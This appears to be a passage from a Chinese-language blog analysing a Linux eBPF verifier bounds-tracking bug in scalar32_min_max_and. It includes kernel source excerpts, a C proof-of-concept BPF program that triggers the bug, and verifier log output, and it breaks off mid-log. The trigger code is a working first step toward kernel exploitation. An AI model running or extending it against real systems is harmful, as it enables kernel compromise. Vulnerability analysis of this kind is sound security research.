<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	__update_reg32_bounds(reg);</span><br><span class="line">	__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">	reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">	reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">				 (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">	reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">	reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">			      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>计算方法如下：<ul>
<li>最小边界值 = <code>[min_value , var_off.value | (var_off.mask &amp; MIN) ]</code> 中的最大者</li>
<li>最大边界值 = <code>[max_value , var_off.value | (var_off.mask &amp; MAX) ]</code> 中的最小者</li>
</ul>
</li>
</ul>
<p>但这样存在一个问题，若存在一个高32位 <code>unknown</code> 低32位 <code>known</code> 的寄存器：</p>
<ul>
<li>在理论上，程序执行时 <code>scalar32_min_max_and</code> 就能确定该寄存器的值，应该调用 <code>__mark_reg_known</code> 进行更新</li>
<li>但程序认为在 <code>scalar_min_max_and</code> 中也能检查寄存器是否 <code>known</code>，因此选择在 <code>scalar_min_max_and</code> 中调用 <code>__mark_reg_known</code>，而 <code>scalar32_min_max_and</code> 中直接返回</li>
<li>核心问题就是，函数 <code>scalar32_min_max_and</code> 和 <code>scalar_min_max_and</code> 中判断寄存器是否 <code>known</code> 的条件不同，导致原本应该执行 <code>__mark_reg_known</code> 的程序没有执行</li>
</ul>
<p>如果有以下两个寄存器：</p>
<ul>
<li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;</code>：该寄存器低 32 位值已知为 <code>0x1</code>，高 32 位不确定</li>
<li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;</code>：该寄存器 64 位值全部已知，为 <code>0x100000002</code></li>
</ul>
<p>假如我们将 R2 与 R3 做与运算，其结果为 <code>&#123; .value = 0, .mask = 0x100000000 &#125;</code>，详细调用过程如下：</p>
<ul>
<li>首先执行 <code>adjust_scalar_min_max_vals</code> 函数，随后会进入 <code>tnum_and</code> 函数<ul>
<li>该函数返回 <code>R2.var_off = &#123;mask = 0x100000000; value=0x0&#125;</code></li>
<li>由于 <code>R2</code> 的高32位是不确定，导致 <code>0x100000002</code> 中高出32位的非“0”部分不确定，所以最终 <code>R2.var_off.mask = 0x100000000</code>（仅有第32位不确定）</li>
</ul>
</li>
<li>然后执行 <code>scalar32_min_max_and</code> 检查寄存器32位的值的范围<ul>
<li>这里由于 <code>R2</code> 和 <code>R3</code> 两个寄存器的低32位的值都是确定的，该函数直接返回</li>
</ul>
</li>
<li>接着执行 <code>scalar_min_max_and</code> 检查寄存器64位的值的范围<ul>
<li>由于 <code>R2</code> 寄存器第32位仍不确定，因此不会调用 <code>__mark_reg_known</code></li>
</ul>
</li>
<li>在末尾调用 <code>__update_reg_bounds</code>，这个函数会对 <code>R2</code> 的值做相应修改：<ul>
<li>设置 <code>R2.u32_max_value=0x0</code>（由于 <code>R2.var_off.value=0 &lt; R2.u32_max_value=1</code>）</li>
<li>设置 <code>R2.u32_min_value=0x1</code>（由于 <code>R2.var_off.value=0 &lt; R2.u32_min_value=1</code>）</li>
</ul>
</li>
<li>最后执行 <code>__reg_bound_offset</code> 函数，也不会改变 <code>R2</code> 的属性</li>
</ul>
<p>因此经过该轮计算之后 R2 的最小值为 <code>1</code>，最大值为 <code>0</code>，而这显然是不合理的</p>
<p>测试样例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bpf_tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POC_PROG(__map_fd)                              \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* Load value from map */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \ <span class="comment">/* r9 = 0 */</span></span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \ <span class="comment">/* r1 = r9 */</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \ <span class="comment">/* r2 = r10(rbp) */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-8</span>),          \ <span class="comment">/* r2 += -8 */</span></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_2, <span class="number">0</span>, <span class="number">0</span>),            \ <span class="comment">/* *(r2 + 0) = 0 */</span></span><br><span class="line">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem), \</span><br><span class="line">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),          \ <span class="comment">/* if r0 != 0x0 goto pc+1 */</span></span><br><span class="line">        BPF_EXIT_INSN(),                                \ <span class="comment">/* jmp exit */</span></span><br><span class="line">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, <span class="number">0</span>),   \ <span class="comment">/* r2 = *(r0 + 0) */</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_4, <span class="number">0xffffffff</span>),           \ <span class="comment">/* r4 = -1 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, <span class="number">32</span>),          \ <span class="comment">/* r4 &lt;&lt;= 32 */</span></span><br><span class="line">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \ <span class="comment">/* r2 &amp;= r4 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">0x1</span>),         \ <span class="comment">/* r2 += 1 */</span></span><br><span class="line">        <span class="comment">/* r3 = 0x100000002 */</span>                          \ </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x1</span>),                  \ <span class="comment">/* r3 = 1 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, <span class="number">32</span>),          \ <span class="comment">/* r3 &lt;&lt;= 32 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">0x2</span>),         \ <span class="comment">/* r3 += 2 */</span></span><br><span class="line">        <span class="comment">/* triger the vulnerability */</span>                  \</span><br><span class="line">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)	  <span class="comment">/* r2 &amp;= r3 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> map_fd;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> log_fd;</span><br><span class="line"></span><br><span class="line">    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, MAP_SIZE, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create eBPF map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        POC_PROG(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./<span class="built_in">exp</span></span><br><span class="line">func#<span class="number">0</span> @<span class="number">0</span></span><br><span class="line"><span class="number">0</span>: R1=ctx(id=<span class="number">0</span>,off=<span class="number">0</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">0</span>: (<span class="number">18</span>) r9 = <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>: R1=ctx(id=<span class="number">0</span>,off=<span class="number">0</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">2</span>: (bf) r1 = r9</span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-8</span></span><br><span class="line"><span class="number">2</span>: (bf) r1 = r9</span><br><span class="line"><span class="number">3</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">3</span>: (bf) r2 = r10</span><br><span class="line"><span class="number">4</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-8</span></span><br><span class="line"><span class="number">5</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp<span class="number">-8</span> R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">5</span>: (<span class="number">7</span>a) *(u64 *)(r2 +<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line"><span class="number">6</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp<span class="number">-8</span> R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">6</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span></span><br><span class="line"><span class="number">7</span>: R0_w=map_value_or_null(id=<span class="number">1</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">7</span>: (<span class="number">55</span>) <span class="keyword">if</span> r0 != <span class="number">0x0</span> <span class="keyword">goto</span> pc+<span class="number">1</span></span><br><span class="line"> R0_w=invP0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">8</span>: R0_w=invP0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">8</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">9</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">9</span>: (<span class="number">79</span>) r2 = *(u64 *)(r0 +<span class="number">0</span>)</span><br><span class="line"> R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">10</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">10</span>: (b7) r4 = <span class="number">-1</span></span><br><span class="line"><span class="number">11</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R4_w=invP<span class="number">-1</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">11</span>: (<span class="number">67</span>) r4 &lt;&lt;= <span class="number">32</span> <span class="comment">/* r4=0xffffffff00000000 */</span></span><br><span class="line"><span class="number">12</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">12</span>: (<span class="number">5f</span>) r2 &amp;= r4 <span class="comment">/* 取r2的高32位 */</span></span><br><span class="line"><span class="number">13</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808512</span>,umax_value=<span class="number">18446744069414584320</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">0</span>,u32_max_val</span><br><span class="line">ue=<span class="number">0</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">13</span>: (<span class="number">07</span>) r2 += <span class="number">1</span></span><br><span class="line"><span class="number">14</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r2=&#123;s32_min_value=1,s32_max_value=1&#125;,var_off=(0x1; 0xffffffff00000000) */</span></span><br><span class="line"><span class="number">14</span>: (b7) r3 = <span class="number">1</span></span><br><span class="line"><span class="number">15</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP1 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">15</span>: (<span class="number">67</span>) r3 &lt;&lt;= <span class="number">32</span></span><br><span class="line"><span class="number">16</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP4294967296 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">16</span>: (<span class="number">07</span>) r3 += <span class="number">2</span> <span class="comment">/* r3=0x100000002 */</span></span><br><span class="line"><span class="number">17</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP4294967298 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r2=&#123;s32_min_value=1,s32_max_value=1&#125;,var_off=(0x1; 0xffffffff00000000) </span></span><br><span class="line"><span class="comment">	  r3=0x100000002,var_off=(0x100000002; 0x0) */</span></span><br><span class="line"><span class="number">17</span>: (<span 